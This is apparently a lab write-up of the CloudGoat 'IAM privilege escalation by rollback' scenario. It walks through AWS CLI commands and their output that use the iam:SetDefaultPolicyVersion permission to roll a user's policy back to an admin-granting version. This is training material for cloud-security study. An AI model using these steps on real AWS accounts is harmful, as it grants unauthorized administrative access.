---
title:  "CloudGoat: IAM Privilege Escalation by Rollback"
date:   2024-03-15
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-15
---

In this scene, we will be `raynor` user who has permission to rollback the policy version. We will use this permission to rollback the policy that has admin access.

I will use `raynor` for AWS CLI profile
{: .notice--info}

### Get `raynor` permission
List attached policies
```shell
aws --profile raynor iam list-attached-user-policies --user-name <raynor-username>
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_###",
            "PolicyArn": "arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_###"
        }
    ]
}
```

Get policy
```shell
aws --profile raynor iam get-policy --policy-arn arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_###
```

Result:
```json
{
    "Policy": {
        "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_###",
        "Arn": "arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_###",
        "Path": "/",
        "DefaultVersionId": "v1"
    }
}
```

Get policy version
```shell
aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_### --version-id v1
```

Result:
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "IAMPrivilegeEscalationByRollback"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1"
    }
}
```

From the result, the `raynor` user has a permission to set default policy version, so we will use this permission to rollback the policy to version that has full admin access.

### List policy versions
We need to know how many version of policy that `raynor` user have.
```shell
aws --profile raynor iam list-policy-versions --policy-arn arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_###
```

Result:
```json
{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": false,
            "CreateDate": "2024-03-15T10:55:18+00:00"
        },
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2024-03-15T10:55:18+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2024-03-15T10:55:18+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2024-03-15T10:55:18+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2024-03-15T10:55:15+00:00"
        }
    ]
}
```

As you can see from the result, the policy has 5 versions and at this time, version 1 is a default version.

### Set default policy version
```shell
aws --profile raynor iam set-default-policy-version --policy-arn arn:aws:iam::###:policy/cg-raynor-policy-iam_privesc_by_rollback_### --version-id <version-id>
```

Voilà, we now have a policy that has admin access.